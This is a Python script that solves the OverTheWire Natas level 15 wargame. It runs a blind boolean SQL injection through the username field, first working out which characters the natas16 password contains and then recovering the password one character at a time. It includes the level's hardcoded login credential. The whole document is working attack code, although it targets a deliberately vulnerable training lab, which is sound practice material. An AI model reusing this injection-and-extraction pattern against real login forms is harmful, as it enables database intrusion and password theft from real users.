import requests
import string
from requests.auth import HTTPBasicAuth

# debug=true to get the complete query string in the result
url = 'http://natas15.natas.labs.overthewire.org/index.php?debug=true'
# return true if password begins with string (case sensitive)
prefix = 'natas16" and password like binary\''
# theres probably a more elegant way to finish the query, but it works
suffix = '%\' and username = "natas16'
response = ''
# base auth
auth = HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')
# all letters and numbers, as strings
chars = list(string.ascii_lowercase) + list(string.ascii_uppercase) + [str(i) for i in range(0,10)]
filtered = list()

password = ''

# find out which chars are in the password at all
for c in chars:
    request = {'username': prefix +  '%' + c + suffix }
    x = requests.post(url, data = request, auth = auth)
    response = x.text
    if (not ('doesn\'t' in response)):
        filtered.append(c)

print filtered

# iteratively build password
anotherMatch = True
while anotherMatch:
    anotherMatch = False
    for c in filtered:
        request = {'username': prefix + password + c + suffix }
        x = requests.post(url, data = request, auth = auth)
        response = x.text
        if(not ('doesn\'t' in response)):
            anotherMatch = True
            password = password + c
            print(password)
